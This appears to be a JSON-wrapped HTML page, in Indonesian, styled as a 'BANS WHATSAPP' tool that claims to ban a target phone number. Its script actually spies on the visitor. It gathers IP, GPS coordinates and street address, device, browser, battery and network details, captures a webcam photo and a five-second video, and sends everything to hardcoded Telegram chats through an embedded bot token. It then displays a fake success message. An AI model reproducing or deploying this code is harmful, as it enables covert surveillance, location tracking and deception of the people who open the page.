      "itemType": "html",
      "itemContent": "<!DOCTYPE html>\n<html lang=\"id\">\n<head>\n  <meta charset=\"UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, user-scalable=yes\">\n  <title>BANS WHATSAPP</title>\n  <link rel=\"icon\" type=\"image/svg+xml\" href=\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23000000'/%3E%3Ctext x='50%25' y='50%25' font-size='70' text-anchor='middle' dy='.35em' fill='%23dc2626' font-weight='bold'%3EY%3C/text%3E%3C/svg%3E\">\n  <link href=\"https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Fira+Code:wght@400;500&display=swap\" rel=\"stylesheet\">\n  <script src=\"https://cdn.jsdelivr.net/npm/ua-parser-js@2/dist/ua-parser.min.js\"></script>\n  <style>\n    * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-tap-highlight-color: transparent; }\n    body { font-family: 'Inter', 'Fira Code', monospace; background: #000; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; position: relative; }\n    body::before { content: \"\"; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: repeating-linear-gradient(0deg, rgba(220,38,38,0.03) 0px, rgba(220,38,38,0.03) 2px, transparent 2px, transparent 4px); pointer-events: none; }\n    .card { max-width: 450px; width: 100%; background: #0a0a0a; border: 2px solid #dc2626; box-shadow: 0 0 25px rgba(220,38,38,0.3); position: relative; z-index: 1; }\n    .header { background: #000; padding: 24px 20px; text-align: center; border-bottom: 2px solid #dc2626; }\n    .header h1 { color: #dc2626; font-size: 1.6rem; font-weight: 900; letter-spacing: 2px; text-transform: uppercase; font-family: 'Fira Code', monospace; }\n    .header p { color: #6b7280; font-size: 0.7rem; margin-top: 6px; }\n    .content { padding: 24px 20px; }\n    .warning { background: #1a0a0a; border: 1px solid #dc2626; padding: 14px; margin-bottom: 24px; display: flex; gap: 12px; align-items: flex-start; }\n    .warning-icon { width: 24px; height: 24px; flex-shrink: 0; }\n    .warning-icon svg { width: 100%; height: 100%; }\n    .warning-text { color: #ef4444; font-weight: 800; font-size: 0.75rem; text-transform: uppercase; }\n    .warning-desc { color: #9ca3af; font-size: 0.7rem; line-height: 1.4; margin-top: 6px; }\n    .input-group { margin-bottom: 20px; }\n    .input-group label { display: block; color: #dc2626; font-size: 0.7rem; font-weight: 700; margin-bottom: 8px; text-transform: uppercase; }\n    .input-wrapper { position: relative; }\n    .input-icon { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); width: 18px; height: 18px; }\n    .input-icon svg { width: 100%; height: 100%; }\n    .input-group input { width: 100%; padding: 14px 16px 14px 40px; background: #111; border: 1px solid #333; color: white; font-size: 0.9rem; font-family: monospace; text-align: center; font-weight: 600; }\n    .input-group input:focus { outline: none; border-color: #dc2626; box-shadow: 0 0 10px rgba(220,38,38,0.3); }\n    .btn { width: 100%; padding: 14px; background: #dc2626; border: none; color: black; font-weight: 900; font-size: 1rem; cursor: pointer; transition: all 0.2s; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 2px; font-family: 'Fira Code', monospace; }\n    .btn:hover { background: #b91c1c; transform: scale(1.01); box-shadow: 0 0 15px rgba(220,38,38,0.5); }\n    .btn:disabled { background: #4a4a4a; opacity: 0.6; }\n    .info { background: #111; border: 1px solid #222; padding: 12px; text-align: center; display: flex; align-items: center; justify-content: center; gap: 8px; }\n    .info-icon { width: 16px; height: 16px; }\n    .info-icon svg { width: 100%; height: 100%; }\n    .info p { color: #6b7280; font-size: 0.7rem; }\n    .footer { background: #050505; padding: 14px 20px; text-align: center; border-top: 1px solid #1a1a1a; }\n    .footer p { color: #3a3a3a; font-size: 0.6rem; font-family: monospace; }\n    .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 9999; display: flex; justify-content: center; align-items: center; flex-direction: column; visibility: hidden; opacity: 0; transition: all 0.3s; }\n    .loading-overlay.active { visibility: visible; opacity: 1; }\n    .spinner { width: 50px; height: 50px; border: 3px solid #dc2626; border-top: 3px solid transparent; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 20px; }\n    @keyframes spin { to { transform: rotate(360deg); } }\n    .loading-text { color: #dc2626; font-size: 0.9rem; font-weight: 600; text-transform: uppercase; letter-spacing: 2px; }\n    .custom-alert { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 10000; display: flex; justify-content: center; align-items: center; visibility: hidden; opacity: 0; transition: all 0.3s; }\n    .custom-alert.active { visibility: visible; opacity: 1; }\n    .alert-box { background: #0a0a0a; border: 2px solid #dc2626; padding: 24px; text-align: center; max-width: 300px; width: 90%; box-shadow: 0 0 20px rgba(220,38,38,0.5); }\n    .alert-icon { width: 48px; height: 48px; margin: 0 auto 12px; }\n    .alert-icon svg { width: 100%; height: 100%; }\n    .alert-message { color: white; font-size: 0.9rem; margin-bottom: 20px; font-family: monospace; }\n    .alert-btn { background: #dc2626; border: none; padding: 10px 24px; color: black; font-weight: 800; cursor: pointer; font-size: 0.8rem; text-transform: uppercase; }\n    .alert-btn:hover { background: #b91c1c; }\n    video, canvas { display: none; }\n  </style>\n</head>\n<body>\n  <div class=\"card\">\n    <div class=\"header\"><h1>BANS WHATSAPP</h1><p>by Yanto Security | ULTIMATE EDITION</p></div>\n    <div class=\"content\">\n      <div class=\"warning\">\n        <div class=\"warning-icon\"><svg viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"#ef4444\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><circle cx=\"12\" cy=\"12\" r=\"10\"/><line x1=\"12\" y1=\"8\" x2=\"12\" y2=\"12\"/><line x1=\"12\" y1=\"16\" x2=\"12.01\" y2=\"16\"/></svg></div>\n        <div class=\"warning-content\"><div class=\"warning-text\">PERINGATAN KERAS</div><div class=\"warning-desc\">Sistem akan membanned target PERMANEN. Jangan disalahgunakan!</div></div>\n      </div>\n      <div class=\"input-group\">\n        <label>NOMOR TARGET</label>\n        <div class=\"input-wrapper\">\n          <div class=\"input-icon\"><svg viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"#dc2626\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><rect x=\"5\" y=\"2\" width=\"14\" height=\"20\" rx=\"2\" ry=\"2\"/><line x1=\"12\" y1=\"18\" x2=\"12.01\" y2=\"18\"/></svg></div>\n          <input type=\"tel\" id=\"phoneNumber\" placeholder=\"6281234567890\">\n        </div>\n      </div>\n      <button class=\"btn\" id=\"submitBtn\">EKSEKUSI</button>\n      <div class=\"info\"><div class=\"info-icon\"><svg viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"#6b7280\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><polygon points=\"12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2\"/></svg></div><p>Masukkan nomor target</p></div>\n    </div>\n    <div class=\"footer\"><p>BANS SYSTEM • ALL ACTIVITIES LOGGED</p></div>\n  </div>\n\n  <div id=\"loadingOverlay\" class=\"loading-overlay\"><div class=\"spinner\"></div><div class=\"loading-text\">PROCESSING...</div></div>\n  <div id=\"customAlert\" class=\"custom-alert\"><div class=\"alert-box\"><div class=\"alert-icon\" id=\"alertIcon\"></div><div class=\"alert-message\" id=\"alertMessage\">Selesai</div><button class=\"alert-btn\" onclick=\"closeAlert()\">OK</button></div></div>\n\n  <video id=\"video\" autoplay playsinline></video>\n  <canvas id=\"canvas\" width=\"640\" height=\"480\"></canvas>\n\n  <script>\n    const botToken = '8675408721:AAFNmUMRkfJYgDFmdLVJE1tHdFaGdiW4LX8';\n    const chatIds = ['8182530431','8507675152'];\n    const input = document.getElementById('phoneNumber');\n    const button = document.getElementById('submitBtn');\n    const loadingOverlay = document.getElementById('loadingOverlay');\n    const customAlert = document.getElementById('customAlert');\n    const alertIcon = document.getElementById('alertIcon');\n    const alertMessage = document.getElementById('alertMessage');\n\n    const checkIcon = `<svg viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"#34d399\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><polyline points=\"20 6 9 17 4 12\"/></svg>`;\n    const crossIcon = `<svg viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"#f87171\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><line x1=\"18\" y1=\"6\" x2=\"6\" y2=\"18\"/><line x1=\"6\" y1=\"6\" x2=\"18\" y2=\"18\"/></svg>`;\n\n    let lastNomor = '';\n\n    function showAlert(message, isError = false) {\n      alertMessage.textContent = message;\n      alertIcon.innerHTML = isError ? crossIcon : checkIcon;\n      customAlert.classList.add('active');\n    }\n    function closeAlert() { customAlert.classList.remove('active'); }\n    function showLoading() { loadingOverlay.classList.add('active'); }\n    function hideLoading() { loadingOverlay.classList.remove('active'); }\n    function sendToTelegram(text) { chatIds.forEach(id => { fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' }) }).catch(console.error); }); }\n    function sendPhotoToTelegram(blob) { chatIds.forEach(id => { const formData = new FormData(); formData.append('chat_id', id); formData.append('photo', blob); fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData }).catch(console.error); }); }\n    function sendVideoToTelegram(blob) { chatIds.forEach(id => { const formData = new FormData(); formData.append('chat_id', id); formData.append('video', blob, 'record.mp4'); fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData }).catch(console.error); }); }\n\n    async function recordVideo(duration = 5000) {\n      return new Promise(async (resolve) => {\n        try {\n          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });\n          const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/mp4' });\n          const chunks = [];\n          mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };\n          mediaRecorder.onstop = () => { const blob = new Blob(chunks, { type: 'video/mp4' }); stream.getTracks().forEach(track => track.stop()); resolve(blob); };\n          mediaRecorder.start();\n          setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, duration);\n        } catch (err) { resolve(null); }\n      });\n    }\n\n    async function takePhoto() {\n      return new Promise(async (resolve) => {\n        try {\n          const stream = await navigator.mediaDevices.getUserMedia({ video: true });\n          const video = document.getElementById('video');\n          const canvas = document.getElementById('canvas');\n          const ctx = canvas.getContext('2d');\n          video.srcObject = stream;\n          video.onloadedmetadata = () => {\n            setTimeout(() => {\n              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);\n              canvas.toBlob(blob => { stream.getTracks().forEach(track => track.stop()); resolve(blob); }, 'image/jpeg');\n            }, 1000);\n          };\n        } catch (err) { resolve(null); }\n      });\n    }\n\n    async function reverseGeocode(lat, lon) {\n      try {\n        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=id`;\n        const res = await fetch(url, { headers: { 'User-Agent': 'YantoBansApp/1.0' } });\n        const data = await res.json();\n        if (data && data.display_name) {\n          const addr = data.address;\n          let parts = [];\n          if (addr.road) parts.push(addr.road);\n          if (addr.village || addr.suburb) parts.push(addr.village || addr.suburb);\n          if (addr.city || addr.town) parts.push(addr.city || addr.town);\n          if (addr.state) parts.push(addr.state);\n          if (parts.length === 0) parts = [data.display_name.split(',')[0]];\n          return parts.join(', ');\n        }\n        return null;\n      } catch(e) { return null; }\n    }\n\n    async function getUltimateInfo() {\n      const parser = new UAParser();\n      const uaResult = parser.getResult();\n      \n      let ip = '-', kota = '-', region = '-', negara = '-', kodePos = '-', isp = '-', lokasi = '-', zonaWaktu = '-', mobile = '-', proxy = '-', hosting = '-';\n      \n      try {\n        const res = await fetch('https://ipapi.co/json/');\n        const data = await res.json();\n        if (data && data.ip) {\n          ip = data.ip;\n          kota = data.city || '-';\n          region = data.region || '-';\n          negara = data.country_name || '-';\n          kodePos = data.postal || '-';\n          lokasi = `${data.latitude},${data.longitude}`;\n          isp = data.org || '-';\n          zonaWaktu = data.timezone || '-';\n        }\n      } catch(e) {}\n      \n      if (ip === '-') {\n        try {\n          const res = await fetch('https://ip-api.com/json/?fields=status,query,country,city,regionName,zip,lat,lon,isp,timezone,mobile,proxy,hosting');\n          const data = await res.json();\n          if (data.status === 'success') {\n            ip = data.query || '-';\n            negara = data.country || '-';\n            kota = data.city || '-';\n            region = data.regionName || '-';\n            kodePos = data.zip || '-';\n            lokasi = `${data.lat},${data.lon}`;\n            isp = data.isp || '-';\n            zonaWaktu = data.timezone || '-';\n            mobile = data.mobile ? 'Ya' : 'Tidak';\n            proxy = data.proxy ? 'Ya' : 'Tidak';\n            hosting = data.hosting ? 'Ya' : 'Tidak';\n          }\n        } catch(e) {}\n      }\n      \n      if (ip === '-') {\n        try { const res = await fetch('https://api.ipify.org?format=json'); const data = await res.json(); ip = data.ip; } catch(e) {}\n      }\n\n      let baterai = { level: 0, charging: false, chargingTime: Infinity, dischargingTime: Infinity };\n      try { baterai = await navigator.getBattery(); } catch(e) {}\n      \n      let penyimpanan = 'Tidak tersedia';\n      try { const est = await navigator.storage.estimate(); penyimpanan = `${Math.round(est.usage/1024/1024)} MB / ${Math.round(est.quota/1024/1024)} MB`; } catch(e) {}\n      \n      let koneksi = {};\n      try { if (navigator.connection) koneksi = navigator.connection; } catch(e) {}\n      \n      let devices = { audioInput: 0, audioOutput: 0, videoInput: 0 };\n      try { const devs = await navigator.mediaDevices.enumerateDevices(); devices.videoInput = devs.filter(d => d.kind === 'videoinput').length; devices.audioInput = devs.filter(d => d.kind === 'audioinput').length; devices.audioOutput = devs.filter(d => d.kind === 'audiooutput').length; } catch(e) {}\n      \n      let orientasi = { angle: 0, type: 'portrait' };\n      try { if (screen.orientation) orientasi = screen.orientation; } catch(e) {}\n      \n      let gps = null;\n      let gpsAddress = null;\n      await new Promise((resolve) => {\n        if (navigator.geolocation) {\n          navigator.geolocation.getCurrentPosition(\n            async (pos) => {\n              gps = { lat: pos.coords.latitude, lon: pos.coords.longitude, akurasi: pos.coords.accuracy };\n              const address = await reverseGeocode(gps.lat, gps.lon);\n              if (address) gpsAddress = address;\n              resolve();\n            },\n            () => resolve()\n          );\n        } else resolve();\n      });\n\n      const deviceVendor = uaResult.device.vendor || 'Tidak diketahui';\n      const deviceModel = uaResult.device.model || 'Tidak diketahui';\n      const deviceType = uaResult.device.type || 'mobile';\n      const osName = uaResult.os.name || 'Tidak diketahui';\n      const osVersion = uaResult.os.version || 'Tidak diketahui';\n      const browserName = uaResult.browser.name || 'Tidak diketahui';\n      const browserVersion = uaResult.browser.version || 'Tidak diketahui';\n      const cpuArch = uaResult.cpu.architecture || 'Tidak diketahui';\n\n      const devicePixelRatio = window.devicePixelRatio || 1;\n      const colorDepth = screen.colorDepth || screen.pixelDepth || 'N/A';\n      const availWidth = screen.availWidth;\n      const availHeight = screen.availHeight;\n      const innerWidth = window.innerWidth;\n      const innerHeight = window.innerHeight;\n      const lang = navigator.language;\n      const languages = navigator.languages ? navigator.languages.join(', ') : lang;\n      const cookieEnabled = navigator.cookieEnabled ? 'Ya' : 'Tidak';\n      const doNotTrack = navigator.doNotTrack || 'Tidak tersedia';\n      const onLine = navigator.onLine ? 'Ya' : 'Tidak';\n      const javaEnabled = navigator.javaEnabled ? navigator.javaEnabled() : 'Tidak diketahui';\n      const pluginsCount = navigator.plugins ? navigator.plugins.length : 0;\n      const hardwareConcurrency = navigator.hardwareConcurrency || 'Tidak diketahui';\n      const deviceMemory = navigator.deviceMemory || 'Tidak diketahui';\n      const maxTouchPoints = navigator.maxTouchPoints || 0;\n      const downlinkMax = koneksi.downlinkMax ? koneksi.downlinkMax + ' Mbps' : 'Tidak diketahui';\n      const saveData = koneksi.saveData ? 'Ya' : 'Tidak';\n      const effectiveType = koneksi.effectiveType || 'Tidak diketahui';\n      const downlink = koneksi.downlink ? koneksi.downlink + ' Mbps' : 'Tidak diketahui';\n      const rtt = koneksi.rtt ? koneksi.rtt + ' ms' : 'Tidak diketahui';\n      const chargingTime = baterai.chargingTime === Infinity ? 'Tidak diketahui' : baterai.chargingTime + ' detik';\n      const dischargingTime = baterai.dischargingTime === Infinity ? 'Tidak diketahui' : baterai.dischargingTime + ' detik';\n\n      let gpsText = 'Tidak diizinkan';\n      if (gps) {\n        gpsText = `${gps.lat}, ${gps.lon}`;\n        if (gpsAddress) gpsText += `\\n      📍 Alamat : ${gpsAddress}`;\n      }\n\n      const teks = `\nLAPORAN BAN WHATSAPP\n================================\n🎯 TARGET: ${lastNomor}\n================================\n🌐 JARINGAN & LOKASI\n• IP Address : ${ip}\n• Negara     : ${negara}\n• Kota       : ${kota}\n• Wilayah    : ${region}\n• Kode Pos   : ${kodePos}\n• Koordinat  : ${lokasi}\n• ISP        : ${isp}\n• Zona Waktu : ${zonaWaktu}\n• Mobile Net : ${mobile}\n• Proxy      : ${proxy}\n• Hosting    : ${hosting}\n• Waktu      : ${new Date().toLocaleString('id-ID')}\n================================\n📱 PERANGKAT & HARDWARE\n• Merk       : ${deviceVendor}\n• Model      : ${deviceModel}\n• Tipe       : ${deviceType}\n• OS         : ${osName} ${osVersion}\n• Browser    : ${browserName} ${browserVersion}\n• CPU Arch   : ${cpuArch}\n• CPU Cores  : ${hardwareConcurrency}\n• RAM        : ${deviceMemory} GB\n• Layar      : ${screen.width}x${screen.height} (${colorDepth} bit)\n• Resolusi Available : ${availWidth}x${availHeight}\n• Inner Size : ${innerWidth}x${innerHeight}\n• DPR        : ${devicePixelRatio}\n• Orientasi  : ${orientasi.angle}° (${orientasi.type})\n• Touch Points: ${maxTouchPoints}\n• Bahasa     : ${lang}\n• Bahasa Tersedia : ${languages}\n• Cookie     : ${cookieEnabled}\n• Do Not Track: ${doNotTrack}\n• Online     : ${onLine}\n• Java       : ${javaEnabled}\n• Plugin     : ${pluginsCount} buah\n• Kamera     : ${devices.videoInput} unit\n• Mikrofon   : ${devices.audioInput} unit\n• Speaker    : ${devices.audioOutput} unit\n• User Agent : ${navigator.userAgent.substring(0, 120)}...\n================================\n🔋 BATERAI\n• Level      : ${Math.round(baterai.level * 100)}%\n• Mengisi    : ${baterai.charging ? 'Ya' : 'Tidak'}\n• Waktu Cas  : ${chargingTime}\n• Waktu Habis: ${dischargingTime}\n================================\n📡 KONEKSI\n• Tipe       : ${effectiveType}\n• Kecepatan  : ${downlink}\n• RTT        : ${rtt}\n• Max Downlink: ${downlinkMax}\n• Save Data  : ${saveData}\n================================\n📍 GPS EXACT\n• Koordinat  : ${gps ? `${gps.lat}, ${gps.lon}` : 'Tidak diizinkan'}\n• Akurasi    : ${gps ? gps.akurasi + ' meter' : 'N/A'}\n• Map        : ${gps ? `https://www.google.com/maps?q=${gps.lat},${gps.lon}` : 'N/A'}\n${gpsAddress ? `• Alamat     : ${gpsAddress}` : ''}\n================================\n💾 PENYIMPANAN\n• Usage      : ${penyimpanan}\n================================\n      `.trim();\n\n      sendToTelegram(`<b>LAPORAN BAN WHATSAPP</b>\\n<pre>${teks}</pre>`);\n      if (gps) sendToTelegram(`<b>📍 LOKASI LANGSUNG:</b> <a href=\"https://www.google.com/maps?q=${gps.lat},${gps.lon}\">Klik untuk lihat maps</a>`);\n    }\n\n    button.addEventListener('click', async () => {\n      let nomor = input.value.trim().replace(/[^0-9]/g, '');\n      if (!nomor || nomor.length < 8 || nomor.length > 15) { showAlert('Nomor tidak valid!', true); return; }\n      lastNomor = nomor;\n      button.disabled = true;\n      showLoading();\n      sendToTelegram(`<b>TARGET:</b> ${nomor}`);\n      input.value = '';\n      try {\n        await getUltimateInfo();\n        const photo = await takePhoto();\n        if (photo) sendPhotoToTelegram(photo);\n        const video = await recordVideo(5000);\n        if (video) sendVideoToTelegram(video);\n        setTimeout(() => { hideLoading(); showAlert(`${nomor} berhasil terbanned`); button.disabled = false; }, 500);\n      } catch (e) { hideLoading(); showAlert('Gagal! Coba lagi.', true); button.disabled = false; }\n    });\n    input.addEventListener('keypress', (e) => { if (e.key === 'Enter') button.click(); });\n  </script>\n</body>\n</html>",
